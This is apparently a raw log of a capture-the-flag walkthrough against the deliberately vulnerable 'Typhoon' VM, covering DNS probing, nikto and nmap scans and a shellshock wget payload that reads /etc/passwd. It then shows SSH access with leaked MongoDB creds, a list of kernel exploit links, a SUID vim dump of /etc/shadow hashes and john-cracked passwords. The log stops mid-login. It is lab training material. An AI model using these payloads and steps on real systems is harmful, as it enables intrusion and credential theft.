+Serveur par dÚfaut :   typhoon.local.axatrs.mgmt
+Address:  192.168.13.208
+
+> set type=any
+> typhoon.local
+Serveur :   typhoon.local.axatrs.mgmt
+Address:  192.168.13.208
+
+DNS request timed out.
+    timeout was 2 seconds.
+typhoon.local
+        primary name server = ns.prismacsi.com
+        responsible mail addr = enes.prismacsi.com
+        serial  = 1
+        refresh = 3600 (1 hour)
+        retry   = 600 (10 mins)
+        expire  = 86400 (1 day)
+        default TTL = 3600 (1 hour)
+typhoon.local   nameserver = ns1.typhoon.local
+typhoon.local   nameserver = ns2.typhoon.local
+ns1.typhoon.local       internet address = 192.168.1.5
+ns2.typhoon.local       internet address = 192.168.1.6
+
+> set query=ANY
+> typhoon.local
+Serveur :   typhoon.local.axatrs.mgmt
+Address:  192.168.13.208
+
+DNS request timed out.
+    timeout was 2 seconds.
+typhoon.local
+        primary name server = ns.prismacsi.com
+        responsible mail addr = enes.prismacsi.com
+        serial  = 1
+        refresh = 3600 (1 hour)
+        retry   = 600 (10 mins)
+        expire  = 86400 (1 day)
+        default TTL = 3600 (1 hour)
+typhoon.local   nameserver = ns2.typhoon.local
+typhoon.local   nameserver = ns1.typhoon.local
+ns1.typhoon.local       internet address = 192.168.1.5
+ns2.typhoon.local       internet address = 192.168.1.6
+>
+
+
+=========================================================================================
+
+root@Security-Audit-01:~# nikto -h http://192.168.1.104
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.104
++ Target Hostname:    192.168.1.104
++ Target Port:        80
++ Start Time:         2019-02-02 21:48:43 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0xdc9 0x578fef1e684d5 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.26
++ Cookie PHPSESSID created without the httponly flag
++ Entry '/mongoadmin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Uncommon header 'nikto-added-cve-2014-6271' found, with contents: true
++ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ Uncommon header 'x-ob_mode' found, with contents: 0
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-3092: /cms/: This might be interesting...
++ /phpmyadmin/: phpMyAdmin directory found
++ 8500 requests: 0 error(s) and 17 item(s) reported on remote host
++ End Time:           2019-02-02 21:50:03 (GMT1) (80 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+--------------------------------------------------------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# nikto -h http://192.168.1.104:8080/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.104
++ Target Hostname:    192.168.1.104
++ Target Port:        8080
++ Start Time:         2019-02-03 02:00:25 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1540237146000 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ /: Appears to be a default Apache Tomcat install.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /manager/status: Tomcat Server Status interface found (pass protected)
++ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2019-02-03 02:00:56 (GMT1) (31 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+=========================================================================================================
+
+=> CVE-2014-6271 - shellshock RCE vulnerability
+
+http://192.168.1.104/cgi-bin/test.sh
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# nmap -sV --script http-shellshock --script-args uri=/cgi-bin/test.sh,cmd=/usr/bin/id 192.168.1.104 -p 80
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-03 18:05 CET
+Nmap scan report for 192.168.1.104
+Host is up (0.00081s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|       is executing commands injected via malicious HTTP headers.
+|             
+|     Disclosure date: 2014-09-24
+|     Exploit results:
+|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+|   <html><head>
+|   <title>500 Internal Server Error</title>
+|   </head><body>
+|   <h1>Internal Server Error</h1>
+|   <p>The server encountered an internal error or
+|   misconfiguration and was unable to complete
+|   your request.</p>
+|   <p>Please contact the server administrator at 
+|    webmaster@localhost to inform them of the time this error occurred,
+|    and the actions you performed just before this error.</p>
+|   <p>More information about this error may be available
+|   in the server error log.</p>
+|   <hr>
+|   <address>Apache/2.4.7 (Ubuntu) Server at 192.168.1.104 Port 80</address>
+|   </body></html>
+|   
+|     References:
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|       http://seclists.org/oss-sec/2014/q3/685
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+MAC Address: 08:00:27:34:BF:F6 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# 
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# wget -U "() { test;};echo \"content-type:text/plain\";echo;echo; /bin/cat /etc/passwd" "http://192.168.1.104/cgi-bin/test.sh"
+
+--2019-02-03 18:07:53--  http://192.168.1.104/cgi-bin/test.sh
+Connecting to 192.168.1.104:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+Saving to: ‘test.sh’
+test.sh                         [ <=>                                        ]   2.25K  --.-KB/s    in 0s      
+2019-02-03 18:07:53 (244 MB/s) - ‘test.sh’ saved [2300]
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# cat test.sh 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:108::/var/run/dbus:/bin/false
+bind:x:104:115::/var/cache/bind:/bin/false
+postfix:x:105:116::/var/spool/postfix:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+dovecot:x:107:118:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:108:119:Dovecot login user,,,:/nonexistent:/bin/false
+landscape:x:109:120::/var/lib/landscape:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
+libvirt-qemu:x:114:107:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
+libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
+tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
+typhoon:x:1000:1000:typhoon,,,:/home/typhoon:/bin/bash
+admin:x:1001:1001:,,,:/home/admin:/bin/bash
+mongodb:x:117:65534::/home/mongodb:/bin/false
+redis:x:118:128::/var/lib/redis:/bin/false
+statd:x:119:65534::/var/lib/nfs:/bin/false
+ftp:x:120:129:ftp daemon,,,:/srv/ftp:/bin/false
+snmp:x:121:130::/var/lib/snmp:/bin/false
+postfixuser:x:1002:1002:,,,:/home/postfixuser:/bin/bash
+ntp:x:87:87:Network Time Protocol:/var/lib/ntp:/bin/false
+
+
+=========================================================================================================
+
+http://192.168.1.104/mongoadmin/
+
+http://192.168.1.104/mongoadmin/index.php?db=credentials&action=listRows&collection=creds
+
+=> display Mongodb creds in clear-text (typhoon:789456123)
+=> Possibility to export the creds in a JSON format file
+
+["a:2:{s:3:\"_id\";C:7:\"MongoId\":24:{5bce38e66c82aa33d0a8c7be}s:8:\"username\";s:7:\"typhoon\";}","a:2:{s:3:\"_id\";C:7:\"MongoId\":24:{5bce38f86c82aa33d0a8c7bf}s:8:\"password\";s:9:\"789456123\";}"]
+
+==========================================================================================================
+
+root@Security-Audit-01:~# ssh typhoon@192.168.1.104
+    d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db 
+    `~~88~~' `8b  d8' 88  `8D 88   88 .8P  Y8. .8P  Y8. 888o  88 
+       88     `8bd8'  88oodD' 88ooo88 88    88 88    88 88V8o 88 
+       88       88    88~~~   88~~~88 88    88 88    88 88 V8o88 
+       88       88    88      88   88 `8b  d8' `8b  d8' 88  V888 
+       YP       YP    88      YP   YP  `Y88P'   `Y88P'  VP   V8P 
+                                                             
+                 Vulnerable VM By PRISMA CSI - www.prismacsi.com
+
+WARNING:  Unauthorized access to this system is forbidden and will be
+prosecuted by law. By accessing this system, you agree that your actions
+may be monitored if unauthorized usage is suspected.
+
+		This is a joke of course :))
+		Please hack me!
+
+-----------------------------------------------------------------------
+typhoon@192.168.1.104's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Sat Feb  2 23:41:12 EET 2019
+
+  System load: 1.95               Memory usage: 2%   Processes:       131
+  Usage of /:  19.7% of 17.34GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Thu Oct 25 19:51:13 2018 from 192.168.1.102
+typhoon@typhoon:~$ 
+typhoon@typhoon:~$ id
+uid=1000(typhoon) gid=1000(typhoon) groups=1000(typhoon),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),112(sambashare),125(libvirtd)
+typhoon@typhoon:~$ sudo -l
+[sudo] password for typhoon: 
+Sorry, user typhoon may not run sudo on typhoon.
+typhoon@typhoon:~$ 
+
+typhoon@typhoon:~$ ls -al
+total 32
+drwxr-xr-x 4 typhoon typhoon 4096 Oct 22 22:53 .
+drwxr-xr-x 5 root    root    4096 Oct 23 23:38 ..
+-rw------- 1 typhoon typhoon   47 Oct 25 19:51 .bash_history
+-rw-r--r-- 1 typhoon typhoon  220 Oct 22 22:40 .bash_logout
+-rw-r--r-- 1 typhoon typhoon 3637 Oct 22 22:40 .bashrc
+drwx------ 2 typhoon typhoon 4096 Oct 22 22:41 .cache
+-rw-r--r-- 1 typhoon typhoon  675 Oct 22 22:40 .profile
+drwxrwxr-x 2 typhoon typhoon 4096 Oct 25 19:50 .ssh
+
+typhoon@typhoon:~$ cat .bash_history 
+<typtyp>
+
+Typh00000n_b4sh_f14g
+
+</typtyp>
+exit
+
+typhoon@typhoon:/$ cd /root
+-bash: cd: /root: Permission denied
+typhoon@typhoon:/$ cd home/
+typhoon@typhoon:/home$ ls
+admin  postfixuser  typhoon
+typhoon@typhoon:/home$ cd admin/
+
+typhoon@typhoon:/home/admin$ ls -al
+total 32
+drwxr-xr-x 4 admin admin 4096 Oct 22 23:01 .
+drwxr-xr-x 5 root  root  4096 Oct 23 23:38 ..
+-rw------- 1 admin admin   40 Oct 25 23:59 .bash_history
+-rw-r--r-- 1 admin admin  220 Oct 22 22:47 .bash_logout
+-rw-r--r-- 1 admin admin 3637 Oct 22 22:47 .bashrc
+drwx------ 2 admin admin 4096 Oct 22 22:48 .cache
+-rw-r--r-- 1 admin admin  675 Oct 22 22:47 .profile
+drwxr-xr-x 2 root  root  4096 Oct 25 19:51 .ssh
+-rw-r--r-- 1 admin admin    0 Oct 22 22:48 .sudo_as_admin_successful
+typhoon@typhoon:/home/admin$ cat .sudo_as_admin_successful 
+typhoon@typhoon:/home/admin$ cd .ssh/
+typhoon@typhoon:/home/admin/.ssh$ ls
+secr3t
+typhoon@typhoon:/home/admin/.ssh$ ls -al
+total 12
+drwxr-xr-x 2 root  root  4096 Oct 25 19:51 .
+drwxr-xr-x 4 admin admin 4096 Oct 22 23:01 ..
+-rw-r--r-- 1 admin admin   42 Oct 24 14:01 secr3t
+
+typhoon@typhoon:/home/admin/.ssh$ cat secr3t 
+<h0h0h0>
+
+ph00n_typ_p0st_flag!
+
+</h0h0h0>
+
+yphoon@typhoon:/$ cd /typhoon
+typhoon@typhoon:/typhoon$ ls
+secret
+typhoon@typhoon:/typhoon$ ls -al
+total 20
+drwxr-xr-x  2 root root 4096 Oct 23 00:51 .
+drwxr-xr-x 25 root root 4096 Oct 24 04:59 ..
+-rw-r--r--  1 root root   63 Oct 24 13:58 secret
+-rw-r--r--  1 root root   24 Oct 23 00:50 .secret
+-rw-------  1 root root 1766 Oct 23 00:51 .secret.rsa
+
+typhoon@typhoon:/typhoon$ cat secret 
+test file
+<rec0nm4st3r> R3c0n_m4steeeee3er_fl4g </rec0nm4st3r>
+
+typhoon@typhoon:/typhoon$ cat .secret 
+belong to typhoon user.
+
+typhoon@typhoon:/typhoon$ 
+
+===================================================================================
+
+root@Security-Audit-01:~/Desktop/Linux-privesc# scp ./Linux-exploit-suggester.sh typhoon@192.168.1.104:/tmp/
+
+
+typhoon@typhoon:/$ cd /tmp
+typhoon@typhoon:/tmp$ ls
+hsperfdata_tomcat7  Linux-exploit-suggester.sh  mongodb-27017.sock  tomcat7-tomcat7-tmp
+typhoon@typhoon:/tmp$ ./Linux-exploit-suggester.sh 
+
+Available information:
+
+Kernel version: 3.13.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 14.04.1
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+70 kernel space exploits
+32 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2014-0038] timeoutpwn
+
+   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
+   Tags: ubuntu=13.10
+   Download URL: https://www.exploit-db.com/download/31346
+   Comments: CONFIG_X86_X32 needs to be enabled
+
+[+] [CVE-2014-0038] timeoutpwn 2
+
+   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
+   Tags: ubuntu=13.10|13.04
+   Download URL: https://www.exploit-db.com/download/31347
+   Comments: CONFIG_X86_X32 needs to be enabled
+
+[+] [CVE-2014-0196] rawmodePTY
+
+   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
+   Download URL: https://www.exploit-db.com/download/33516
+
+[+] [CVE-2014-4014] inode_capable
+
+   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
+   Tags: ubuntu=12.04
+   Download URL: https://www.exploit-db.com/download/33824
+
+[+] [CVE-2014-5207] fuse_suid
+
+   Details: https://www.exploit-db.com/exploits/34923/
+   Download URL: https://www.exploit-db.com/download/34923
+
+[+] [CVE-2015-9322] BadIRET
+
+   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
+   Tags: RHEL<=7,fedora=20
+   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
+
+[+] [CVE-2015-3290] espfix64_NMI
+
+   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
+   Download URL: https://www.exploit-db.com/download/37722
+
+[+] [CVE-2015-1328] overlayfs
+
+   Details: http://seclists.org/oss-sec/2015/q2/717
+   Tags: [ ubuntu=12.04|14.04|14.10|15.04 ]
+   Download URL: https://www.exploit-db.com/download/37292
+
+[+] [CVE-2015-8660] overlayfs (ovl_setattr)
+
+   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+   Download URL: https://www.exploit-db.com/download/39230
+
+[+] [CVE-2015-8660] overlayfs (ovl_setattr)
+
+   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+   Tags: [ ubuntu=14.04|15.10 ]
+   Download URL: https://www.exploit-db.com/download/39166
+
+[+] [CVE-2016-0728] keyring
+
+   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
+   Download URL: https://www.exploit-db.com/download/40003
+   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
+
+[+] [CVE-2016-2384] usb-midi
+
+   Details: https://xairy.github.io/blog/2016/cve-2016-2384
+   Tags: [ ubuntu=14.04 ],fedora=22
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
+   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
+
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE
+
+   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
+   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only
+
+[+] [CVE-2017-6074] dccp
+
+   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
+   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
+   Download URL: https://www.exploit-db.com/download/41458
+   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
+
+[+] [CVE-2017-7308] af_packet
+
+   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
+   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-7308/CVE-2017-7308/poc.c
+   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
+
+[+] [CVE-2017-1000253] PIE_stack_corruption
+
+   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
+   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
+   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
+
+[+] [CVE-2009-1185] udev
+
+   Details: https://www.exploit-db.com/exploits/8572/
+   Tags: ubuntu=8.10|9.04
+   Download URL: https://www.exploit-db.com/download/8572
+   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 
+
+[+] [CVE-2009-1185] udev 2
+
+   Details: https://www.exploit-db.com/exploits/8478/
+   Download URL: https://www.exploit-db.com/download/8478
+   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed
+
+[+] [CVE-2015-1318] newpid (apport)
+
+   Details: http://openwall.com/lists/oss-security/2015/04/14/4
+   Tags: [ ubuntu=14.04 ]
+   Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
+
+[+] [CVE-2015-1318] newpid (apport) 2
+
+   Details: http://openwall.com/lists/oss-security/2015/04/14/4
+   Tags: ubuntu=14.04.2
+   Download URL: https://www.exploit-db.com/download/36782
+
+[+] [CVE-2015-3202] fuse (fusermount)
+
+   Details: http://seclists.org/oss-sec/2015/q2/520
+   Tags: debian=7.0|8.0,[ ubuntu=* ]
+   Download URL: https://www.exploit-db.com/download/37089
+   Comments: Needs cron or system admin interaction
+
+[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain
+
+   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
+   Tags: ubuntu=16.04.1
+   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
+   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+   Tags: ubuntu=16.04|16.10,debian=7|8
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+
+[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
+   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
+
+[+] [CVE-2018-1000001] RationalLove
+
+   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
+   Tags: debian=9{glibc:2.24-11+deb9u1},ubuntu=16.04.3{glibc:2.23-0ubuntu9}
+   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
+   Comments: kernel.unprivileged_userns_clone=1 required
+
+typhoon@typhoon:/tmp$ 
+
+=========================================================================================================
+
+typhoon@typhoon:/tmp$ cat /tab/script.sh
+echo "Typhoon is UP!"
+
+#<typh00n!> P0st_3xpl01t3R_flaqGq <typhoon!>
+
+
+========================================================================================================
+
+typhoon@typhoon:/tmp$ ./LinEnum.sh -t > /tmp/LinEnum-report.txt
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# scp typhoon@192.168.1.104:/tmp/LinEnum-report.txt ./
+
+
+========================================================================================================
+
+Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 2191736 Jan  2  2014 /usr/bin/vim.basic
+
+typhoon@typhoon:/tmp$ /usr/bin/vim.basic /etc/shadow
+
+root:$6$xlUx2G5p$.6IGWvV41rccKNfq7BeLhDFB6YZtsbpHGppKPZ0Cp9/1w1a/xx/UtyPy02f1gdv4tw4ibqOyzVcmwutrOiWlq1:17826:0:99999:7:::
+daemon:*:16273:0:99999:7:::
+bin:*:16273:0:99999:7:::
+sys:*:16273:0:99999:7:::
+sync:*:16273:0:99999:7:::
+games:*:16273:0:99999:7:::
+man:*:16273:0:99999:7:::
+lp:*:16273:0:99999:7:::
+mail:*:16273:0:99999:7:::
+news:*:16273:0:99999:7:::
+uucp:*:16273:0:99999:7:::
+proxy:*:16273:0:99999:7:::
+www-data:*:16273:0:99999:7:::
+backup:*:16273:0:99999:7:::
+list:*:16273:0:99999:7:::
+irc:*:16273:0:99999:7:::
+gnats:*:16273:0:99999:7:::
+nobody:*:16273:0:99999:7:::
+libuuid:!:16273:0:99999:7:::
+syslog:*:16273:0:99999:7:::
+mysql:!:17826:0:99999:7:::
+messagebus:*:17826:0:99999:7:::
+bind:*:17826:0:99999:7:::
+postfix:*:17826:0:99999:7:::
+dnsmasq:*:17826:0:99999:7:::
+dovecot:*:17826:0:99999:7:::
+dovenull:*:17826:0:99999:7:::
+landscape:*:17826:0:99999:7:::
+sshd:*:17826:0:99999:7:::
+postgres:$6$ux4FkQLd$J1KPeMEqZ70s.yzSvfE9jOXM5Dk4jd2qssEsg9J7mpGyd7ZwxS/cdakkkD6Syf9Y665WQI3dF9O.XpyS/ZLky1:17828:0:99999:7:::
+avahi:*:17826:0:99999:7:::
+colord:*:17826:0:99999:7:::
+list:*:16273:0:99999:7:::
+irc:*:16273:0:99999:7:::
+gnats:*:16273:0:99999:7:::
+nobody:*:16273:0:99999:7:::
+libuuid:!:16273:0:99999:7:::
+syslog:*:16273:0:99999:7:::
+mysql:!:17826:0:99999:7:::
+messagebus:*:17826:0:99999:7:::
+bind:*:17826:0:99999:7:::
+postfix:*:17826:0:99999:7:::
+dnsmasq:*:17826:0:99999:7:::
+dovecot:*:17826:0:99999:7:::
+dovenull:*:17826:0:99999:7:::
+landscape:*:17826:0:99999:7:::
+sshd:*:17826:0:99999:7:::
+postgres:$6$ux4FkQLd$J1KPeMEqZ70s.yzSvfE9jOXM5Dk4jd2qssEsg9J7mpGyd7ZwxS/cdakkkD6Syf9Y665WQI3dF9O.XpyS/ZLky1:17828:0:99999:7:::
+avahi:*:17826:0:99999:7:::
+colord:*:17826:0:99999:7:::
+libvirt-qemu:!:17826:0:99999:7:::
+libvirt-dnsmasq:!:17826:0:99999:7:::
+tomcat7:*:17826:0:99999:7:::
+typhoon:$6$Zslnrk.8$iBnvXYM8Nv7fIkBxXCkePAqMyf7LL4eRiOwJDBfED4MNJLT1aylOPTSS35uDfiGhC08AXPsI.OyhOp8bVE1aj.:17826:0:99999:7:::
+admin:$6$M3KsZ2d4$rWSmSyz.RmEk2LXT3MCnHB18oerMZWLfSPwUzxWAqTVn2TWTmHX8n8BjgtpY1Q2/3F7fAmn/QOR44/Dyrm4.R.:17826:0:99999:7:::
+mongodb:*:17826:0:99999:7:::
+redis:*:17826:0:99999:7:::
+statd:*:17826:0:99999:7:::
+ftp:*:17826:0:99999:7:::
+snmp:*:17827:0:99999:7:::
+postfixuser:$6$usZFne7q$L6Lu8pgFTiD/G6HMPKOTEryvWUtlWaAEF7LugMSRN58/MbzPvmb1gVJdOO4EnYE8JogClKvJ1bA6d6dzeTpVl1:17827:0:99999:7:::
+ntp:!:17828:0:99999:7:::
+
+=================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# john shadow.txt --show
+postgres:postgres
+typhoon:789456123
+admin:metallica
+
+3 password hashes cracked, 2 left
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# ssh admin@192.168.1.104
+    d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db 
